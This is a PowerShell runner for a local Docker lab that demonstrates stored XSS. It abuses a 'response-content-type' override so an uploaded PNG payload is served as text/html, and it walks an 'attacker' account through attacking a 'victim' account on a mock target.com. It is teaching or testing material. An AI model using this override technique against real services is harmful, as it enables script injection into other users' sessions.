# Windows-friendly lab runner (PowerShell).
# Usage:
#   powershell -ExecutionPolicy Bypass -File .\scripts\run-lab.ps1
$ErrorActionPreference = "Stop"
Set-Location (Split-Path $PSScriptRoot -Parent)

$hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
$hostsText = if (Test-Path $hostsPath) { Get-Content $hostsPath -Raw } else { "" }
if ($hostsText -notmatch "(?m)^\s*127\.0\.0\.1\s+target\.com") {
    Write-Host "[!] 'target.com' is not in your hosts file yet."
    Write-Host "    Open PowerShell as Administrator and run:"
    Write-Host '    Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "127.0.0.1 target.com"'
}

Write-Host "[*] Building and starting the full lab stack (bound to 127.0.0.1 only)..."
docker compose up -d --build

Write-Host "[*] Waiting for bucket initialization..."
$ready = $false
foreach ($i in 1..60) {
    $logs = (docker compose logs setup 2>$null) | Out-String
    if ($logs -match "LAB-READY") { $ready = $true; break }
    Start-Sleep -Seconds 2
}
if (-not $ready) {
    Write-Host "[!] setup did not finish in time. Last logs:"
    docker compose logs setup | Select-Object -Last 20
    exit 1
}

$base = "http://127.0.0.1:9000"

function Show-Stage([string]$title, [string]$url) {
    Write-Host ""
    Write-Host "=============================================================="
    Write-Host " $title"
    Write-Host "=============================================================="
    Write-Host "GET $url"
    Write-Host "--- response ---"
    curl.exe -sS -D - -o NUL $url
}

Show-Stage "Stage 1 - baseline GET (the uploader's forced Content-Type)" `
    "$base/public/avatar-payload.png"

Show-Stage "Stage 2 - ?response-content-type=text/html (the override)" `
    "$base/public/avatar-payload.png?response-content-type=text/html"

Write-Host ""
Write-Host "=============================================================="
Write-Host " Stage 3 - verify the stored payload is served as HTML"
Write-Host "=============================================================="
$tmp = Join-Path $env:TEMP "lab-body.html"
$resp = curl.exe -sS -D - -o $tmp "$base/public/avatar-payload.png?response-content-type=text/html"
$ct = ($resp | Where-Object { $_ -match "^Content-Type:" } | Select-Object -Last 1)
Write-Host "served as: $ct"

$body = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes($tmp))
$scripts = [regex]::Matches($body, "<script>[^<]*</script>")
foreach ($m in $scripts) { Write-Host $m.Value }

if ($ct -match "text/html" -and $scripts.Count -gt 0) {
    Write-Host ""
    Write-Host "[+] Stored XSS confirmed: attacker-controlled bytes served as text/html."
} else {
    Write-Host ""
    Write-Host "[-] Not exploitable: override did not apply or no script in body."
    exit 1
}

Write-Host ""

Write-Host "=============================================================="
Write-Host " Part B - the 'real target' site: http://target.com:8080"
Write-Host "=============================================================="
Write-Host " 1. Open http://target.com:8080 in your browser and log in:"
Write-Host "    alice / alice-pass-123   (victim)"
Write-Host "    bob   / bob-pass-123     (attacker)"
Write-Host " 2. In a second (private) window, log in as bob and upload"
Write-Host "    payloads/avatar-payload.png from the 'Upload avatar' page."
Write-Host " 3. Then open this crafted link as logged-in alice:"
Write-Host "    http://target.com:8080/uploads/avatar-bob.png?response-content-type=text/html"
Write-Host ""
Write-Host "Reset everything (including avatars): docker compose down -v"
